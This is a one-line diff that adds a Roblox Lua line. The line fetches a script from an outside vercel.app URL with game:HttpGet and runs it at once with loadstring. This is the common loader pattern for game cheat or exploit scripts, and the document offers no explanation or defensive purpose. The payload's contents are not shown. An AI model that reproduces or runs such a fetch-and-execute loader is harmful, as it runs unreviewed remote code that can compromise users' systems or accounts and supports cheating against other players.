@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://moontechscripts.vercel.app/c4313e0cac3d465ba00c14e3c69c5968.lua", true))()
